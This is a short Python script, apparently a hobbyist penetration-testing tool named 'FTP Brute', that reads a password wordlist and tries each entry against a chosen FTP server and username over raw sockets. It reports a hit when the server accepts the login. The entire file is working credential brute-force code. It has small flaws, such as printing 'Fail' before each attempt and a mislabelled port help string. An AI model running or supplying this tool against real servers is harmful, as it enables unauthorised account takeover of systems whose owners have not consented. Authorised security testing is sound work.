#!/usr/bin/python
import socket 
import argparse
from pyfiglet import Figlet
from termcolor import colored

### special effects
msg_font=('larry3d')
msg_ok=colored('[+]', 'green')
msg_fail=colored('[-]', 'red')
msg_banner="FTP Brute" 
msg_banner_custom = Figlet(font=msg_font)
msg_banner_color=colored(msg_banner_custom.renderText(msg_banner), 'blue')
### special effects

msg_usage=" \n Usase: python3 ftpbrute.py -t <target> -p <port> [optional] -u <username>  -w <wordlist.txt>"
msg_target="Name or IP Address"
msg_word="File with list of possible password" 
msg_user="Account name" 
msg_port="Port number" 

print(msg_banner_color)
parameters = argparse.ArgumentParser(description=msg_usage)
parameters.add_argument("-t","--target" ,  dest="target", help=msg_target)
parameters.add_argument("-u","--user" ,  dest="user", help=msg_user)
parameters.add_argument("-p","--port",default=21,  dest="port", help=msg_user, type=int)
parameters.add_argument("-w","--wordlist", dest="wordlist", help=msg_word)
parameters_args = parameters.parse_args()

if parameters_args.user == None:
    print(parameters.description)
    exit(0)

if parameters_args.target == None:
    print(parameters.description)
    exit(0)

if parameters_args.wordlist == None:
    print(parameters.description)
    exit(0)

username=str(parameters_args.user)
hostname=parameters_args.target
port=parameters_args.port
wordlist=parameters_args.wordlist

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        ftpconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftpconn.connect((hostname,port))
        answer=ftpconn.recv(1024)
        
        print( msg_fail + " Fail -> Username: " + username + " Password: " + _password)

        ftpconn.send(str.encode('USER ' + username + '\r\n'))
        ftpconn.recv(1024)

        ftpconn.send(str.encode('PASS ' + _password + '\r\n'))
        ftpanwser=ftpconn.recv(1024)

        if "230" in ftpanwser.decode('utf-8'):
            print( msg_ok + " Bingo -> Username: " + colored(username, 'green') + " - Password is: " + colored(_password, 'green')) 

        ftpconn.close()
